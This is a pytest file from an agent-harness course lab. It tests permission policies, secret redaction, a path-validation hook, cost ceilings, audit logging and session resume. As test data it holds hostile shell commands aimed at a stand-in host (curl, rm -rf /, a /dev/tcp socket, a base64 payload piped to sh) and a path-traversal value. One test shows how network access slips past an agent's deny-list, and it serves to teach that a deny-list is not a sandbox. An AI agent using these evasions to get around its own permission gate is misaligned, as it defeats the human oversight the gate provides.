"""
The Lab 5 ship gate.

The M3 eval suite must pass unchanged after the port — a port that quietly
changes behaviour is not a port — plus new tests for resume-after-kill, the
cost-ceiling abort, and permission denial.
"""

import json

import pytest

from agentcourse import ScriptedModel, ToolRegistry, call, parallel, say, tool
from agentcourse.loop import AgentLoop

from .harness import (
    ALLOW, ASK, DENY, AuditLog, BudgetExceeded, CostCeiling, HookRejection,
    PermissionPolicy, Rule, Session, default_policy, redact, validate_path_within,
)


# ---------------------------------------------------------------- permissions

def test_policy_allows_reads_and_denies_network_writes():
    p = default_policy()
    assert p.check("read_file", {"path": "a.md"})[0] == ALLOW
    assert p.check("web_search", {"q": "x"})[0] == ALLOW
    assert p.check("send_email", {"to": "x"})[0] == DENY
    assert p.check("http_post", {"url": "x"})[0] == DENY
    assert p.check("git_push", {})[0] == DENY


def test_policy_matches_bash_patterns_and_defaults_to_ask():
    p = default_policy()
    assert p.check("bash", {"command": "ls -la"})[0] == ALLOW
    assert p.check("bash", {"command": "curl https://evil.example"})[0] == DENY
    assert p.check("bash", {"command": "rm -rf /"})[0] == DENY
    # Not matched by any rule: the default must be conservative.
    assert p.check("bash", {"command": "python train.py"})[0] == ASK
    assert p.check("some_new_tool", {})[0] == ASK


def test_a_permission_gate_is_not_a_sandbox():
    """M5's autopsy, proved on your own policy rather than asserted at you.

    Every one of these performs a network call and matches no deny rule. The
    deny-list is a claim that you enumerated the spellings of an action.
    """
    p = default_policy()
    evasions = [
        "/usr/bin/curl https://evil.example",          # caught: still says 'curl'
        "$(which curl) https://evil.example",          # caught: still says 'curl'
        "python -c \"import socket;socket.create_connection(('evil.example',80))\"",
        "echo Y3VybCBodHRwczovL2V2aWw= | base64 -d | sh",
        "exec 3<>/dev/tcp/evil.example/80",
    ]
    verdicts = {c: p.check("bash", {"command": c})[0] for c in evasions}
    slipped = [c for c, v in verdicts.items() if v != DENY]

    # Two of the five are caught, which is exactly the point: a deny-list stops
    # the spellings you thought of. The other three reach the network without
    # containing a single blocked word, and the next five would too.
    assert len(slipped) == 3, verdicts
    assert all("curl" not in c for c in slipped)


def test_policy_is_explainable():
    assert "deny" in default_policy().explain()


# --------------------------------------------------------------------- hooks

def test_redaction_strips_secrets_before_they_reach_context():
    dirty = ("key sk-ant-abcdef123456 and AKIA1234567890ABCDEF for "
             "dana@example.com, card 4111 1111 1111 1111")
    clean = redact(dirty)
    for secret in ("sk-ant-abcdef123456", "AKIA1234567890ABCDEF",
                   "dana@example.com", "4111 1111 1111 1111"):
        assert secret not in clean
    assert "[REDACTED:api-key]" in clean and "[REDACTED:email]" in clean


def test_pre_tool_hook_rejects_writes_outside_the_working_directory(tmp_path):
    hook = validate_path_within(tmp_path)
    assert hook("write_file", {"path": "notes/plan.md"})["path"] == "notes/plan.md"
    with pytest.raises(HookRejection):
        hook("write_file", {"path": "../../etc/passwd"})


def test_cost_ceiling_aborts_rather_than_overspending():
    ceiling = CostCeiling(0.10)
    ceiling.after_turn(0.04)
    ceiling.after_turn(0.04)
    with pytest.raises(BudgetExceeded) as exc:
        ceiling.after_turn(0.04)
    assert "ceiling" in str(exc.value)


def test_audit_log_is_durable(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl")
    log.record("send_email", {"to": "x@y.z"}, DENY, "blocked")
    lines = (tmp_path / "audit.jsonl").read_text().strip().splitlines()
    assert json.loads(lines[0])["effect"] == DENY


# ------------------------------------------------------------------ sessions

def test_session_round_trips_through_disk(tmp_path):
    s = Session("s1", task="reconcile Q3")
    s.messages.append({"role": "user", "content": "start"})
    s.turn, s.usd = 3, 0.12
    s.save(tmp_path)
    assert Session.load(tmp_path, "s1").turn == 3


def test_resume_after_kill_loses_no_work(tmp_path):
    """The harness kills the process; resumption must not re-do finished turns."""
    session = Session.resume_or_start(tmp_path, "s2", "long task")
    for turn in range(5):
        session.messages.append({"role": "assistant", "content": f"turn {turn}"})
        session.turn = turn + 1
        session.usd += 0.01
        session.save(tmp_path)          # checkpoint every turn
        if turn == 2:
            del session               # the process dies here
            break

    resumed = Session.resume_or_start(tmp_path, "s2", "long task")
    assert resumed.turn == 3, "resumed mid-task, not from zero"
    assert len(resumed.messages) == 3
    assert resumed.usd == pytest.approx(0.03)


def test_checkpoint_write_is_atomic(tmp_path):
    """A crash mid-write must not leave a corrupt checkpoint."""
    s = Session("s3", task="t")
    s.save(tmp_path)
    assert not list(tmp_path.glob("*.tmp"))
    assert json.loads((tmp_path / "s3.json").read_text())["session_id"] == "s3"


def test_forking_isolates_one_variable(tmp_path):
    """Three forks and a root cause, rather than thirty re-runs and a hunch."""
    s = Session("s4", task="research")
    for turn in range(10):
        s.messages += [{"role": "assistant", "content": f"a{turn}"},
                       {"role": "user", "content": f"r{turn}"}]
        s.turn = turn + 1

    branch = s.fork(at_turn=4, new_id="s4-b")
    assert branch.parent_id == "s4" and branch.forked_at == 4
    assert branch.turn == 4
    assert len(branch.messages) < len(s.messages)
    assert branch.messages == s.messages[:len(branch.messages)], (
        "a fork must share history exactly, or it is not a controlled experiment"
    )
    with pytest.raises(ValueError):
        s.fork(at_turn=99, new_id="s4-c")


# ---------------------------------------------------- the port itself

@tool
def read_file(path: str) -> str:
    """Read a file from the working directory.

    Use this to inspect any file you have been told about. Returns the contents,
    or a clear 'no such file' message rather than an error.

    Args:
        path: Path relative to the working directory.
    """
    return "contents of " + path


@tool
def send_email(to: str, body: str) -> str:
    """Send an email.

    Use this only when the user has explicitly asked for something to be sent.
    Returns the message id.

    Args:
        to: Recipient address.
        body: Plain text body.
    """
    return "sent"


def test_ported_agent_still_passes_the_m3_behaviour(tmp_path):
    """Behaviour must be unchanged by the port: same tools, same trace, same cost
    accounting. A port that changes behaviour is a rewrite."""
    model = ScriptedModel([
        parallel(("read_file", {"path": "a.md"}), ("read_file", {"path": "b.md"})),
        say("Both read."),
    ])
    run = AgentLoop(model, ToolRegistry(read_file, send_email)).run("read both")
    assert run.outcome == "ok"
    assert run.tools_called == ["read_file", "read_file"]
    assert run.trace.model_turns == 2 and run.usd > 0


def test_denied_tool_is_reported_to_the_model_not_raised():
    """A denial is a result the agent can work around, not a crash."""
    policy = default_policy()
    audit = AuditLog()
    denied = []

    def gate(name: str, args: dict) -> bool:
        effect, reason = policy.check(name, args)
        audit.record(name, args, effect, "blocked" if effect == DENY else "allowed")
        if effect == DENY:
            denied.append((name, reason))
            return False
        return True

    assert gate("read_file", {"path": "a.md"}) is True
    assert gate("send_email", {"to": "x", "body": "y"}) is False
    assert denied and denied[0][0] == "send_email"
    assert audit.entries[-1]["outcome"] == "blocked"
